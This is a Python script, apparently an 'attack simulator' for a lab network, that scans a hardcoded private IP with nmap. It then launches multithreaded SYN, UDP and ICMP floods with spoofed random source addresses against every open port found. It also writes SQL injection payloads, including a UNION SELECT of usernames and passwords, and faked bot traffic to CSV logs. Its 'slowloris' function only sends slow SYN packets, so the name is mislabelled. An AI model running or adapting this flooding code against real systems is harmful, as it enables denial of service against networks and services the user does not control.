import threading
import time
import pandas as pd
import os
import subprocess
import logging
from scapy.all import IP, TCP, UDP, ICMP, send, sendp, RandIP
from faker import Faker
from concurrent.futures import ThreadPoolExecutor
import platform

if platform.system() == "Windows":
    NMAP_PATH = r"C:\Program Files (x86)\Nmap\nmap.exe"
else:
    NMAP_PATH = "nmap"  # Use system nmap on macOS/Linux

target_ip = "192.168.101.159"
faker = Faker()

LOG_FILE = "attack_logs.txt"

def setup_logger():
    logging.basicConfig(
        filename=LOG_FILE,
        level=logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    )

setup_logger()
logging.info("Attack Simulator Started.")

def check_nmap():
    try:
        result = subprocess.run([NMAP_PATH, "--version"], capture_output=True, text=True, check=True)
        print(result.stdout)
        return True
    except FileNotFoundError:
        logging.error(f"[ERROR] Nmap not found at {NMAP_PATH}. Please install it.")
        return False

def get_open_ports(target):
    logging.info(f"Scanning open ports on {target}...")
    ports = []
    try:
        result = subprocess.run([NMAP_PATH, "-p", "1-65535", target], capture_output=True, text=True, check=True)
        lines = result.stdout.split("\n")
        for line in lines:
            if "/tcp" in line and "open" in line:
                port = int(line.split("/")[0])
                ports.append(port)
        logging.info(f"Found open ports: {ports}")
        return ports
    except Exception as e:
        logging.error(f"[ERROR] Nmap scanning failed: {e}")
        return []

if not check_nmap():
    exit()

open_ports = get_open_ports(target_ip)
if not open_ports:
    logging.info("[INFO] No open ports found. Please check your target IP manually.")
    exit()

def syn_flood(port):
    logging.info(f"Starting SYN Flood Attack on port {port}...")
    try:
        for _ in range(10000):  
            packet = IP(dst=target_ip, src=RandIP()) / TCP(dport=port, flags="S")
            send(packet, verbose=False)
        logging.info(f"[SUCCESS] SYN Flood Attack on port {port} completed!")
    except Exception as e:
        logging.error(f"[ERROR] SYN Flood Attack failed: {e}")

def udp_flood(port):
    logging.info(f"Starting UDP Flood Attack on port {port}...")
    try:
        for _ in range(10000):  
            packet = IP(dst=target_ip, src=RandIP()) / UDP(dport=port) / (b"\x00" * 512)  # Large packet
            send(packet, verbose=False)
        logging.info(f"[SUCCESS] UDP Flood Attack on port {port} completed!")
    except Exception as e:
        logging.error(f"[ERROR] UDP Flood Attack failed: {e}")

def slowloris(port):
    logging.info(f"Starting Slowloris Attack on port {port}...")
    try:
        for _ in range(5000):  
            send(IP(dst=target_ip, src=RandIP()) / TCP(dport=port, flags="S"), verbose=False)
            time.sleep(0.1)  
        logging.info(f"[SUCCESS] Slowloris Attack on port {port} completed!")
    except Exception as e:
        logging.error(f"[ERROR] Slowloris Attack failed: {e}")

def icmp_flood():
    logging.info("Starting ICMP (Ping) Flood Attack...")
    try:
        for _ in range(5000):  
            packet = IP(dst=target_ip, src=RandIP()) / ICMP()
            send(packet, verbose=False)
        logging.info("[SUCCESS] ICMP Flood Attack completed!")
    except Exception as e:
        logging.error(f"[ERROR] ICMP Flood Attack failed: {e}")

def sql_injection():
    logging.info("Generating SQL Injection Logs...")
    try:
        sql_samples = ["' OR '1'='1' --", "' UNION SELECT username, password FROM users --"]
        df = pd.DataFrame({"Attack Type": ["SQL Injection"] * len(sql_samples), "Payload": sql_samples})
        df.to_csv("sql_injection_logs.csv", index=False)
        logging.info("[SUCCESS] SQL Injection Logs generated!")
    except Exception as e:
        logging.error(f"[ERROR] SQL Injection log generation failed: {e}")

def fake_bot_traffic():
    logging.info("Generating Fake Bot Traffic...")
    try:
        data = [{"IP": faker.ipv4(), "Attack_Type": "Bot Traffic", "Payload": faker.sentence()} for _ in range(500)]
        df = pd.DataFrame(data)
        df.to_csv("fake_bot_traffic.csv", index=False)
        logging.info("[SUCCESS] Fake Bot Traffic generated!")
    except Exception as e:
        logging.error(f"[ERROR] Fake Bot Traffic generation failed: {e}")

with ThreadPoolExecutor(max_workers=10) as executor:
    for port in open_ports:
        executor.submit(syn_flood, port)
        executor.submit(udp_flood, port)  
        executor.submit(slowloris, port)

    executor.submit(icmp_flood)  
    executor.submit(sql_injection)
    executor.submit(fake_bot_traffic)

print("[INFO] All attacks completed!")
